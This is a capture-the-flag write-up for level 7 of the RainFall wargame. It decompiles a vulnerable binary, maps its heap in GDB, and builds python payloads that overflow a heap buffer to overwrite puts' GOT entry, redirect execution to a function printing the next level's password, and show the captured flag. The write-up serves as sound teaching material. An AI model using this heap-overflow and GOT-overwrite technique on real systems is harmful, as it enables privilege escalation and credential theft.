## LEVEL 7

This level is rather complicated, so i will use `Ghidra` to firstly translate the program in C.

```c
char c[68];

void
m (void) {
	time_t tVar1;

	tVar1 = time((time_t *)0);
	printf("%s - %d\n", c, tVar1);
	return;
}

int
main (int ac, char **av) {
	int		*s1;
	int		*s2;

	s1 = malloc(8);
	s1[0] = 1;
	s1[1] = malloc(8);
	s2 = malloc(8);
	s2[0] = 2;
	s2[1] = malloc(8);

	strcpy((char *)s1[1], av[1]);
	strcpy((char *)s2[1], av[2]);
	fgets(c, 68, fopen("/home/user/level8/.pass", "r"));
	puts("~~");
	return (0);
}
```

Now that we have a better compression of this program, we can understand what this code does ? Firstly we see a bunch of `malloc()`, so i will use `GDB` to see what happen in the memory.

```shell
level7@RainFall:~$ gdb -q level7
Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
(gdb) b *0x080485ba
Breakpoint 1 at 0x80485ba
(gdb) b *0x0804859d
Breakpoint 2 at 0x804859d
(gdb) b *0x080485d3
Breakpoint 3 at 0x80485d3
(gdb) r $(python -c 'print("A"*8)') $(python -c 'print("B"*8)')
Starting program: /home/user/level7/level7 $(python -c 'print("A"*8)') $(python -c 'print("B"*8)')

Breakpoint 2, 0x0804859d in main ()
(gdb) x/32x $eax - 16
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
```

Perfect now that we have a better understanding of the memory, we know that the first `strcpy()` will write on the address `0x0804a018` and the second `strcpy()` will write on the address `0x0804a038`. So if we overflow the first `strcpy()` to change the address `0x0804a038` we can ask to `strcpy()` to write on the address we want.

We've seen previously that we `puts()` function use a GOT jump, so if we change the jump address with the function `m()` we can launch the function then `printf()` the stream with our flag.

But to create our payload, we need some informations.

---

#### Padding

The padding is the space between the address given to `strdup()` and our target address. In our case, this is the distance between `0x804a018` and `0x804a02c`.

`0x804a02c - 0x804a018 = 0x14 -> 20`

---

#### `puts()` jump address

```shell
(gdb) i func
All defined functions:

Non-debugging symbols:
[...]
0x08048400  puts
0x08048400  puts@plt
[...]
(gdb) disas 0x08048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```

`puts()` jump address is : `0x8049928`

---

#### `m()` address

```shell
(gdb) i func
All defined functions:

Non-debugging symbols:
[...]
0x080484f4  m
[...]
```

`m()` address is : `0x080484f4`

---

### Payload

`python -c 'print "\x90" * 20 + "\x28\x99\x04\x08"' > /tmp/payload_1`

`python -c 'print "\xf4\x84\x04\x08"' > /tmp/payload_2`

We just have to set the payload as parameter to get the flag.

```shell
level7@RainFall:~$ ./level7 $(cat /tmp/payload_1) $(cat /tmp/payload_2)
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1657910055
```

